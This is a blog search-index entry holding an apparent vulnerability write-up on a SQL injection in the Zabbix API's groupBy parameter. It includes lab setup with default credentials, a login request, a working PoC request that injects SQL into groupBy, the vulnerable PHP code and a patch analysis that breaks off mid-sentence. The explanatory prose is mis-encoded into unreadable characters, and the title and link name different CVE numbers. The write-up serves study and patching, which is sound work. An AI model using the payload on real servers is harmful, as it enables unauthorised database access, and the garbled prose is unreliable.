<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2024-42327 Zabbix SQLæ³¨å…¥æ¼æ´åˆ†æ</title>
      <link href="/2025/04/09/CVE-2024-36465%20Zabbix%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/04/09/CVE-2024-36465%20Zabbix%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote><p>ä»…ä¾›å­¦ä¹ äº¤æµï¼Œè¯·å‹¿ç”¨äºéæ³•è¡Œä¸º</p></blockquote><p>çœ‹åˆ°æœ‰å…¬ä¼—å·å‘äº†æ¼æ´æè¿°ï¼Œä½†æ²¡æœ‰è¯¦æƒ…ï¼Œç›´æ¥åˆ†æä¸€æ‰‹</p><h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p>Zabbix æ˜¯ä¸€æ¬¾å¼€æºçš„ç½‘ç»œç›‘æ§å’ŒæŠ¥è­¦ç³»ç»Ÿï¼Œç”¨äºç›‘è§†ç½‘ç»œè®¾å¤‡ã€æœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºçš„æ€§èƒ½å’Œå¯ç”¨æ€§ã€‚</p><p>ä¸€ä¸ªå…·æœ‰ API è®¿é—®æƒé™çš„ä½æƒé™ï¼ˆå¸¸è§„ï¼‰Zabbix ç”¨æˆ·å¯ä»¥åˆ©ç”¨ include&#x2F;classes&#x2F;api&#x2F;CApiService.php ä¸­çš„ SQL æ³¨å…¥æ¼æ´ï¼Œé€šè¿‡ groupBy å‚æ•°æ‰§è¡Œä»»æ„ SQL å‘½ä»¤ã€‚</p><h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-d8f6844232d4ed3afd1d81118b86e06bcf536bf9.png" alt="image.png"></p><p>7.0.0 &lt;&#x3D; zabbix &lt;&#x3D; 7.0.7</p><p>7.2.0 &lt;&#x3D; zabbix &lt;&#x3D; 7.2.1</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>è®¿é—®<a href="https://cdn.zabbix.com/zabbix/appliances/stable/7.0/7.0.7/">https://cdn.zabbix.com/zabbix/appliances/stable/7.0/7.0.7/</a></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-2160dd452e49ca9cb00bd2f6cf06583efdab9ed7.png" alt="image.png"></p><p>é€‰æ‹© vmx.tar.gz è¿™ä¸ªï¼Œè§£å‹åŒå‡».vmx æ–‡ä»¶å³å¯å¯¼å…¥ vmware workstation</p><p>ç„¶åå¼€æœºå³å¯ï¼Œè®¿é—®æœºå™¨ip 80ç«¯å£å³å¯çœ‹åˆ° zabbix ç™»å½•é¡µé¢ï¼Œé»˜è®¤è´¦å·å¯†ç æ˜¯root&#x2F;zabbix</p><h2 id="php-è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#php-è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="php è°ƒè¯•ç¯å¢ƒæ­å»º"></a>php è°ƒè¯•ç¯å¢ƒæ­å»º</h2><p>æºç ä» <a href="https://cdn.zabbix.com/zabbix/sources/stable/7.0/">https://cdn.zabbix.com/zabbix/sources/stable/7.0/</a> ä¸‹è½½</p><p>è¿™é‡Œå’Œè™šæ‹Ÿæœºä¸€æ ·ç”¨ 7.0.7 ç‰ˆæœ¬çš„ï¼Œæ¼æ´ä¿®å¤å‰çš„ç‰ˆæœ¬æ–¹ä¾¿ diff æºç </p><p>åç»­æ­¥éª¤å¯å‚è€ƒä¹‹å‰å†™çš„ä¸€ç¯‡æ–‡ç« <a href="https://forum.butian.net/article/639">https://forum.butian.net/article/639</a></p><p>é‡Œé¢æœ‰ä¸¤å¤„å°é”™è¯¯</p><ul><li>wget è™šæ‹Ÿæœºé‡Œé¢æ²¡å†…ç½®ï¼Œå¯ä»¥ç”¨ curl æ›¿ä»£</li><li>tar ä¹Ÿæ²¡å†…ç½®ï¼Œå¯ä»¥ç”¨ <code>yum install -y tar</code> å®‰è£…</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯æ”¹å®Œ php.ini åéœ€è¦ç”¨ systemctl restart php-fpm é‡å¯ä¸€ä¸‹ï¼ˆå› ä¸ºè¿™ä¸ªæµªè´¹å¥½å¤šæ—¶é—´ï¼ŒğŸ˜­ï¼‰</p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>è¿™ä¸ªå½±å“çš„æ˜¯ include&#x2F;classes&#x2F;api&#x2F;CApiService.php è¿™ä¸ªæ–‡ä»¶çš„ applyQueryOutputOptions æ–¹æ³•ï¼Œè€Œæä¾› api æœåŠ¡çš„å„ä¸ªç±»éƒ½ç»§æ‰¿äº†è¿™ä¸ªCApiServiceç±»ï¼Œå› æ­¤æŒ‰é“ç†è°ƒç”¨äº† <code>parent::applyQueryOutputOptions()</code>éƒ½æ˜¯å­˜åœ¨ SQL æ³¨å…¥åˆ©ç”¨å¯èƒ½çš„ã€‚è¿™é‡Œé€‰å–äº†æˆ‘ä»¬çš„è€æœ‹å‹ï¼ŒCUser ç±»</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-7b9e4290c22f28f9bd804e1a001a6042c4007486.png" alt="image.png"></p><p>é¦–å…ˆéœ€è¦ç”¨è´¦å·å¯†ç è·å– auth å­—æ®µï¼Œæ‰èƒ½æ‹¿åˆ° api è®¿é—®æƒé™</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api_jsonrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.182.130</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json-rpc</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>106</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user.login&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Admin&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;zabbix&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-8c07328ea06823646a39c4e76adb290425036580.png" alt="image.png"></p><p>å¸¦ä¸Šè·å–åˆ°çš„ auth å­—æ®µï¼Œæ„é€  Poc å¦‚ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api_jsonrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.182.130</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json-rpc</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>183</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;method&quot;</span>: <span class="string">&quot;user.get&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;params&quot;</span>: &#123; <span class="string">&quot;groupBy&quot;</span>: [<span class="string">&quot;roleid, version()&quot;</span>, <span class="string">&quot;roleid&quot;</span>], <span class="string">&quot;userids&quot;</span>: <span class="string">&quot;1&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;auth&quot;</span>: <span class="string">&quot;019e6c5b253ba57e8158df85bb6aaf0d&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;id&quot;</span>: <span class="number">1</span></span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-27f9b3f7aa816970530e582e0b701ca6726d46a2.png" alt="image.png"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>è¿™é‡Œæ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ diff æºç çœ‹çœ‹æ”¹äº†ä»€ä¹ˆ</p><p>ä»åˆšåˆšæ­å»ºç¯å¢ƒçš„æºç é“¾æ¥ä¸­ä¸‹ä¸€ä¸ª 7.0.8 çš„</p><p>ä½¿ç”¨ vscode æ’ä»¶ Compare Folders è¿›è¡Œ diffï¼Œå¯ä»¥è½»æ¾æ‰¾åˆ°æ¼æ´æè¿°æ‰€è¯´çš„åœ°æ–¹</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-61ab433cdc31055c8a8be15b180b2f951bfe497a.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">applyQueryOutputOptions</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$table_name</span>, <span class="keyword">string</span> <span class="variable">$table_alias</span>, <span class="keyword">array</span> <span class="variable">$options</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">array</span> <span class="variable">$sql_parts</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">pk</span>(<span class="variable">$table_name</span>);</span><br><span class="line">  <span class="variable">$pk_composite</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$pk</span>, <span class="string">&#x27;,&#x27;</span>) !== <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;countOutput&#x27;</span>, <span class="variable">$options</span>) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;countOutput&#x27;</span>]</span><br><span class="line">      &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">requiresPostSqlFiltering</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">    <span class="variable">$has_joins</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$sql_parts</span>[<span class="string">&#x27;from&#x27;</span>]) &gt; <span class="number">1</span></span><br><span class="line">      || (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;left_join&#x27;</span>, <span class="variable">$sql_parts</span>) &amp;&amp; <span class="variable">$sql_parts</span>[<span class="string">&#x27;left_join&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pk_composite</span> &amp;&amp; <span class="variable">$has_joins</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Joins with composite primary keys are not supported in this API version.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>] = <span class="variable">$has_joins</span></span><br><span class="line">      ? [<span class="string">&#x27;COUNT(DISTINCT &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fieldId</span>(<span class="variable">$pk</span>, <span class="variable">$table_alias</span>).<span class="string">&#x27;) AS rowscount&#x27;</span>]</span><br><span class="line">      : [<span class="string">&#x27;COUNT(*) AS rowscount&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Select columns used by group count.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;groupCount&#x27;</span>, <span class="variable">$options</span>) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;groupCount&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$sql_parts</span>[<span class="string">&#x27;group&#x27;</span>] <span class="keyword">as</span> <span class="variable">$fields</span>) &#123;</span><br><span class="line">        <span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>][] = <span class="variable">$fields</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;groupBy&#x27;</span>, <span class="variable">$options</span>) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;groupBy&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;groupBy&#x27;</span>] <span class="keyword">as</span> <span class="variable">$field</span>) &#123;</span><br><span class="line">        <span class="variable">$field</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fieldId</span>(<span class="variable">$field</span>, <span class="variable">$table_alias</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>], <span class="variable">$field</span>);</span><br><span class="line">        <span class="variable">$sql_parts</span>[<span class="string">&#x27;group&#x27;</span>][] = <span class="variable">$field</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;groupBy&#x27;</span>, <span class="variable">$options</span>) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;groupBy&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>] = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;groupBy&#x27;</span>] <span class="keyword">as</span> <span class="variable">$field</span>) &#123;</span><br><span class="line">      <span class="variable">$field</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fieldId</span>(<span class="variable">$field</span>, <span class="variable">$table_alias</span>);</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>], <span class="variable">$field</span>);</span><br><span class="line">      <span class="variable">$sql_parts</span>[<span class="string">&#x27;group&#x27;</span>][] = <span class="variable">$field</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// custom output</span></span><br><span class="line">  <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;output&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>] = <span class="variable">$pk_composite</span> ? [] : [<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fieldId</span>(<span class="variable">$pk</span>, <span class="variable">$table_alias</span>)];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;output&#x27;</span>] <span class="keyword">as</span> <span class="variable">$field</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">hasField</span>(<span class="variable">$field</span>, <span class="variable">$table_name</span>)) &#123;</span><br><span class="line">        <span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>][] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fieldId</span>(<span class="variable">$field</span>, <span class="variable">$table_alias</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>] = <span class="title function_ invoke__">array_unique</span>(<span class="variable">$sql_parts</span>[<span class="string">&#x27;select&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// extended output</span></span><br><span class="line">  <span class="keyword">elseif</span> (<span class="variable">$options</span>[<span class="string">&#x27;output&#x27;</span>] == API_OUTPUT_EXTEND) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> API_OUTPUT_EXTEND must return ONLY the fields from the base table</span></span><br><span class="line">    <span class="variable">$sql_parts</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addQuerySelect</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">fieldId</span>(<span class="string">&#x27;*&#x27;</span>, <span class="variable">$table_alias</span>), <span class="variable">$sql_parts</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$sql_parts</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fieldId</span>(<span class="params"><span class="variable">$fieldName</span>, <span class="variable">$tableAlias</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$tableAlias</span> = <span class="variable">$tableAlias</span> ? <span class="variable">$tableAlias</span> : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">tableAlias</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$tableAlias</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$fieldName</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$options å°±æ˜¯æˆ‘ä»¬å¯æ§çš„ä¼ å‚ï¼Œå¾ˆå®¹æ˜“åˆ†æå‡º groupBy å­—æ®µå¯æ§æ—¶ï¼Œå¯ä»¥æ§åˆ¶ <code>$sql_parts</code>çš„ group</p><p>è€Œåœ¨ç»§æ‰¿å¹¶è°ƒç”¨çš„è¿™ä¸ªæ–¹æ³•çš„ç±»ï¼Œå¦‚ CUser ç±»ï¼Œä¼šå°† $sql_parts è§£æä¸º sql æŸ¥è¯¢è¯­å¥è¿›è¡ŒæŸ¥è¯¢</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-424815131f71b30d00ce39b4915e0068be13b6f5.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createSelectQueryFromParts</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$sqlParts</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$sql_left_join</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;left_join&#x27;</span>, <span class="variable">$sqlParts</span>)) &#123;</span><br><span class="line">    <span class="variable">$l_table</span> = DB::<span class="title function_ invoke__">getSchema</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;left_table&#x27;</span>][<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$sqlParts</span>[<span class="string">&#x27;left_join&#x27;</span>] <span class="keyword">as</span> <span class="variable">$left_join</span>) &#123;</span><br><span class="line">      <span class="variable">$sql_left_join</span> .= <span class="string">&#x27; LEFT JOIN &#x27;</span>.<span class="variable">$left_join</span>[<span class="string">&#x27;table&#x27;</span>].<span class="string">&#x27; &#x27;</span>.<span class="variable">$left_join</span>[<span class="string">&#x27;alias&#x27;</span>].<span class="string">&#x27; ON &#x27;</span>;</span><br><span class="line">      <span class="variable">$sql_left_join</span> .= <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;condition&#x27;</span>, <span class="variable">$left_join</span>)</span><br><span class="line">        ? <span class="variable">$left_join</span>[<span class="string">&#x27;condition&#x27;</span>]</span><br><span class="line">        : <span class="variable">$sqlParts</span>[<span class="string">&#x27;left_table&#x27;</span>][<span class="string">&#x27;alias&#x27;</span>].<span class="string">&#x27;.&#x27;</span>.<span class="variable">$l_table</span>[<span class="string">&#x27;key&#x27;</span>].<span class="string">&#x27;=&#x27;</span>.</span><br><span class="line">          <span class="variable">$left_join</span>[<span class="string">&#x27;alias&#x27;</span>].<span class="string">&#x27;.&#x27;</span>.<span class="variable">$left_join</span>[<span class="string">&#x27;using&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Moving a left table to the end.</span></span><br><span class="line">    <span class="variable">$table_id</span> = <span class="variable">$sqlParts</span>[<span class="string">&#x27;left_table&#x27;</span>][<span class="string">&#x27;table&#x27;</span>].<span class="string">&#x27; &#x27;</span>.<span class="variable">$sqlParts</span>[<span class="string">&#x27;left_table&#x27;</span>][<span class="string">&#x27;alias&#x27;</span>];</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="title function_ invoke__">array_search</span>(<span class="variable">$table_id</span>, <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>])]);</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][] = <span class="variable">$table_id</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sqlSelect</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;select&#x27;</span>]));</span><br><span class="line">  <span class="variable">$sqlFrom</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>]));</span><br><span class="line">  <span class="variable">$sqlWhere</span> = <span class="keyword">empty</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>]) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; WHERE &#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27; AND &#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>]));</span><br><span class="line">  <span class="variable">$sqlGroup</span> = <span class="keyword">empty</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;group&#x27;</span>]) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; GROUP BY &#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;group&#x27;</span>]));</span><br><span class="line">  <span class="variable">$sqlOrder</span> = <span class="keyword">empty</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;order&#x27;</span>]) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; ORDER BY &#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$sqlParts</span>[<span class="string">&#x27;order&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;SELECT&#x27;</span>.<span class="built_in">self</span>::<span class="title function_ invoke__">dbDistinct</span>(<span class="variable">$sqlParts</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sqlSelect</span>.</span><br><span class="line">      <span class="string">&#x27; FROM &#x27;</span>.<span class="variable">$sqlFrom</span>.</span><br><span class="line">      <span class="variable">$sql_left_join</span>.</span><br><span class="line">      <span class="variable">$sqlWhere</span>.</span><br><span class="line">      <span class="variable">$sqlGroup</span>.</span><br><span class="line">      <span class="variable">$sqlOrder</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç›´æ¥æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œè€Œä¸”è¿˜æœ‰ä¸€ä¸ªç»†èŠ‚ï¼Œæ­£å¸¸æ¥è¯´æ˜¯ group by åé¢çš„è¯­å¥å¯æ§ï¼Œé‚£è¿˜ä¸æ˜¯é‚£ä¹ˆå¥½æ³¨å…¥çš„ï¼Œä½†ä½†ä½†æ˜¯</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-14a49969b29320ed4327693d2e97a47685b408a4.png" alt="image.png"></p><p>è¿™é‡Œç»™å¯æ§çš„ groupBy å­—æ®µç»™å¤åˆ¶åˆ°äº† select åé¢é‚£ä¸ª column æ‰€åœ¨çš„ partï¼Œæ‰€ä»¥ poc ä¹Ÿå¾ˆå®¹æ˜“æ„é€ </p><p><img src="https://shs3.b.qianxin.com/attack_forum/2025/04/attach-960956327f22e802c5a8e4a0b36ce099f3571284.png" alt="image.png"></p><h1 id="ä¿®å¤è¡¥ä¸"><a href="#ä¿®å¤è¡¥ä¸" class="headerlink" title="ä¿®å¤è¡¥ä¸"></a>ä¿®å¤è¡¥ä¸</h1><p>è¿™é‡Œä¿®å¤çš„ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨ç»™ $sql_parts èµ‹å€¼å‰æ£€æŸ¥è¿™ä¸ªè¡¨é‡Œé¢æ˜¯å¦å­˜åœ¨è¿™ä¸ªå­—æ®µï¼ˆæ¯”å¦‚ CUser 